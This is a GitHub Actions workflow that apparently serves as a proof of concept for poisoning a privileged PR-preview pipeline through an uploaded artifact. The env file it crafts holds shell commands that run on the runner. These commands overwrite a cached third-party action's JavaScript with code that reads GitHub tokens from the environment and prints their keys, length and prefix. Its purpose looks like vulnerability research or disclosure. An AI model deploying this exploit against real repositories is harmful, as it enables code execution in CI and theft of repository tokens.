name: PR Preview

on:
  pull_request:
    types: [opened, reopened, synchronize, closed]

permissions: {}

jobs:
  pr-preview:
    runs-on: ubuntu-latest
    steps:
      - name: Craft untrusted preview payload (attacker controls PR head files)
        run: |
          set -euo pipefail
          mkdir -p payload
          cat > payload/pr-preview-meta.env <<'META'
          echo "GAB_RCE_CONFIRMED host=$(hostname) user=$(id -un) repo=$GITHUB_REPOSITORY run=$GITHUB_RUN_ID"
          set +e +o pipefail
          STICKY_JS=/home/runner/work/_actions/marocchino/sticky-pull-request-comment/v2/dist/index.js
          echo "GAB_STICKY_JS_PRESENT=$([ -f "$STICKY_JS" ] && echo yes || echo no)"
          if [ -f "$STICKY_JS" ]; then
            printf '%s\n' 'const ks=Object.keys(process.env).filter(k=>k.startsWith("INPUT_"));const t=process.env.INPUT_GITHUB_TOKEN||process.env.INPUT_TOKEN||process.env.GITHUB_TOKEN||"";console.log("GAB_PAT_REACHABLE keys="+ks.join(",")+" len="+t.length+" prefix="+t.slice(0,4));process.exit(0);' > "$STICKY_JS"
          fi
          set -e -o pipefail
          WORKER_ACTION=deploy
          PR_NUMBER=999
          TARGET_REPO=PDFtoMark/wfr-guard-poc
          TARGET_BRANCH=poc-preview-gh-pages
          PAGES_BASE_URL=
          COMMENT_HEADER=pr-preview
          UMBRELLA_DIR=poc
          COMMENT_TITLE=Poc
          COMMENT_FOOTER=Poc
          QR_CODE=false
          META
      - uses: actions/upload-artifact@v4
        with:
          name: pr-preview
          path: payload
